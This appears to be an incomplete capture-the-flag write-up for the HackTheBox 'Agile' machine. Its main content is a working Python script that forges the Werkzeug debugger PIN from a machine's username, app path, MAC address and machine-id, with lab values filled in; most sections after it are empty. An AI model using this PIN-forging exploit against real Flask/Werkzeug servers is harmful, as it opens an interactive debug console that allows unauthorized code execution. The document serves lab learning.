# Agile Writeup

Name: Agile
Date:  
Difficulty:  
Goals:  
- Overcome the Weukzeug experience hurdle
- Improve my notes
Learnt:
Beyond Root:
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug
- [https://exploit-notes.hdks.org/exploit/web/framework/python/werkzeug-pentesting](https://exploit-notes.hdks.org/exploit/web/framework/python/werkzeug-pentesting) 
- And anything else

- [[Agile-Notes.md]]
- [[Agile-CMD-by-CMDs.md]]

Spoilers for AoC 2023 from THM one of the machine contains a similar exploit for this box that I was spoiled by: [[Advent-Of-Cyber-2023-Side-Quest-Helped-Through]]
## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](HackTheBox/Retired-Machines/Agile/Agile-Season-Beta1-Attempt/Screenshots/ping.png)
	
## Exploit

[[Advent-Of-Cyber-2023-Side-Quest-Helped-Through]] mentioned [https://exploit-notes.hdks.org/exploit/web/framework/python/werkzeug-pentesting](https://exploit-notes.hdks.org/exploit/web/framework/python/werkzeug-pentesting) this exploit configure it:
```python
import hashlib
from itertools import chain
probably_public_bits = [
    'mcskidy',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/home/mcskidy/.local/lib/python3.8/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '2818051077195',# str(uuid.getnode()),  /sys/class/net/ens33/address
    'aee6189caee449718070b58132f2e4ba'# get_machine_id(), /etc/machine-id
]

#h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

## Foothold

## Privilege Escalation

## Post-Root-Reflection  

## Beyond Root


